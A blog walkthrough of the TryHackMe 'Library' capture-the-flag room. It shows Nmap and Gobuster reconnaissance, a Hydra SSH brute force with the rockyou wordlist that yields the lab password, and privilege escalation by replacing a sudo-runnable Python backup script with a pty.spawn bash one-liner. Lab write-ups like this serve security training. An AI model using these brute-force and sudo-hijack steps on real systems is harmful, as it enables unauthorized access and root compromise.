# TryHackMe - Library (Write-Up)

_3 min read · April 6, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Library**](https://tryhackme.com/room/bsidesgtlibrary) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: stuxnet

---

## Scanning for Open Ports

Machine IP: 10.48.154.138.

As usual, I started with an [**Nmap**](https://www.kali.org/tools/nmap/) scan:

```bash
nmap -T4 -p- 10.48.154.138
sudo nmap -sCV -p 21,22,80 10.48.154.138
```

![Nmap Output](./img/thm-library/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open and `robots.txt` is available.

As usual, I browsed the site first.

![Library: Website](./img/thm-library/web.png)

Nothing interesting was found, including in the source code.

I checked `robots.txt`:

```output
User-agent: rockyou
Disallow: /
```

This looks like a hint to use the `rockyou.txt` wordlist for password brute forcing.

There is also a user named 'meliodas' in the site, so I assumed this is the valid username.

---

## Futher Enumeration on the Website

Next, I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate directories.

```bash
gobuster dir -u http://10.48.154.138 -w /usr/share/wordlists/dirb/big.txt -t 100
```

![Gobuster Output](./img/thm-library/gobuster-output.png)

Nothing interesting was found here as well.

---

## Gaining Initial Access

Since I already had a possible username and a hint for a wordlist, I proceeded to brute force SSH using [**Hydra**](https://www.kali.org/tools/hydra/).

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.48.154.138 ssh
```

```output
[22][ssh] host: 10.48.154.138   login: meliodas   password: iloveyou1
```

The attack was successful, and I obtained valid credentials.

I logged in via SSH and found the **user flag**.

![User Flag](./img/thm-library/user-flag.png)

---

## Privilege Escalation

I checked for allowed sudo commands for user 'meliodas'.

```bash
sudo -l
```

```output
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

I can run a Python script as root without a password.

I checked the content of `bak.py`:

```output
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The script is simply creating a backup of the website directory.

Since `bak.py` is owned by root, I do not have permission to modify it directly.

However, I noticed that I have write permission in the directory, which means I can delete and replace the file.

So instead of modifying it, I removed the original script and created a new malicious one:

```bash
rm bak.py
echo 'import pty;pty.spawn("/bin/bash")' > bak.py
```

Then I executed it using sudo:

```bash
sudo /usr/bin/python /home/meliodas/bak.py
```

I successfully became root.

I then navigated to `/root` directory and retrieved the **root flag**.

![Root Flag](./img/thm-library/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- identify password hints from `robots.txt`
- perform SSH brute force using Hydra

Thank you for reading and see you next time!
